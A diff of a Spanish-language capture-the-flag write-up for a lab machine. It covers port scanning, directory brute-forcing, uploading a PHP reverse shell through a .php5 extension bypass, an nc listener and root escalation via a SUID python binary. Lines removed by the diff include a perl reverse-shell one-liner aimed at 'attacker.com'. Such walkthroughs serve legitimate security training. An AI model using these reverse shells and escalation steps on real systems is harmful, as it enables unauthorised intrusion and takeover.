@@ -77,7 +77,7 @@ http://10.10.252.141 [200 OK] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERV
 
 Vemos que es la versión 2.4.29 y conseguimos la segunda pregunta.
 
-El servicio del puerto 22 ya nos lo reporta el esacneo anterior pero para obtener un poco más de información podemos hacer: 
+El servicio del puerto 22 ya nos lo reporta el esacaneo anterior pero para obtener un poco más de información podemos hacer: 
 
 ```bash
 ❯ nmap -sCV -p22,80 10.10.252.141 -oN targeted
@@ -109,7 +109,7 @@ Debido a que el puerto 80 está abierto, nos metemos en la dirección $IP-VICTIM
 A continuación pasamos a la siguiente pregunta en la que tenemos que encontrar el directorio oculto. Para ello mediante la herramineta gobuster hacemos:
 
 ```bash
-gobuster dir -u http://10.10.252.141/ -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt 
+> gobuster dir -u http://10.10.252.141/ -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt 
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -158,9 +158,11 @@ Encontramos el directorio oculto que sabemos que empieza por /p????
 
 Nos metemos en el directorio oculto desde el navegador y parece que podemos subir archivos, probaremos entonces a conseguir una reverse shell mediante este método.
 
+# []($header-1)File Upload Vulnerability (Direct File upload)
+
 Primero comprobaremos que se pueden subir imagenes correctamente. Para ello, tras subirla en /p???? nos dirigimos al directorio /uploads que hemos reconocido en el paso anterior con gobuster.
 
-La imagen aparece en el panel de /uploads por lo que si que nos deja. El siguiente paso será descargarnos una php reverse shell. En mi caso lo he hecho desde <a href=https://pentestmonkey.net/tools/web-shells/php-reverse-shell> Pentest Monkey</a>
+La imagen aparece en el panel de /uploads por lo que si que nos deja. El siguiente paso será descargarnos una php reverse shell. En mi caso lo he hecho desde <a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell"> Pentest Monkey </a>
 
 Una vez descargada modificamos el archivo .php, tanto el puerto, por ejemplo el 4444 como el valor $ip. **¡Debe ser tu IP!**
 
@@ -183,7 +185,7 @@ Desde la máquina atcante nos ponemos en escucha por el puerto 4444 con nc:
 listening on [any] 4444 ...
 ```
 
-Agregamos nuestra reverse shell con extension .php5 porque con php no nos deja y le damos a upload.
+Agregamos nuestra reverse shell con extension .php5 (porque con php no nos deja) y le damos a upload.
 
 Nos dice que todo ha ido correcto y nos metemos en el panel de /uploads. Ahí se encunetra el archivo .php5
 
@@ -203,7 +205,8 @@ $
 
 Conseguimos acceso a la máquina víctima
 
-# []($header-1)Escalada de privilegios
+
+# []($header-1)Enumareación interna y escalada de privilegios
 
 Buscamos un archivo en el sistema que se llame user.txt y lo abrimos
 
@@ -213,41 +216,25 @@ $ find / -type f -name user.txt 2>/dev/null
 $ cat /var/www/user.txt
 THM{???_???_?_?????}
 ```
-
-Ahora debemos obtener una reverse shell. Intentamos realizar una bash reverse shell pero no funciona por lo que lo intento con perl. Entramos en <a href="https://gtfobins.github.io/">gtfobins</a> para poder buscar la reverse shell con perl. 
-
-Desde la máquina atacante nos ponemos en escucha por el puerto 444 con nc:
+Para buscar archivos con permisos SUID podemos hacer:
 
 ```bash
-nc -lnvp 4444
+$ find / type -f -user root -perm -u=s 2> /dev/null
+```
+Encontramos así la respuesta a la siguiente pregunta:
+
+```vash
+/usr/bin/python
 ```
 
-Por otro lado, desde la máquina víctima introducimos la perl reverse shell:
+Sabiendo que tenemos permisos, para escalar privilegios podemos usar uno de los métodos de <a href="https://gtfobins.github.io/gtfobins/python/#suid"> GTFOBins</a>
 
 ```bash
-export RHOST=attacker.com
-export RPORT=12345
-perl -e 'use Socket;$i="$ENV{RHOST}";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-```
-
-Obtenemos así la reverse shell y podemos ejecutar comandos desde la máquina atacante.
-
-Abrimos el archivo "second ingredients" y obtenemos el segundo ingrediente.
-
-```bash
-cat 'second ingredients'
-```
-
-Con sudo -l podemos observar los permisos que tiene el usuario Rick a la hora de ejecutar comandos. En este caso podemos realizar todos los comandos como sudo por lo que listamos lo que hay en el usuario root mediante:
-
-```bash
-sudo ls /root/ y vemos un archivo txt
-```
-
-Lo abrimos y obtenemos el último ingrediente!
-
-```bash
-sudo cat /root/3rd.txt
+$ ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+# whoami
+root
+# cat /root/root.txt
+THM{????????}
 ```
 
 Muchas gracias por leer este writeup, espero que te haya gustado!
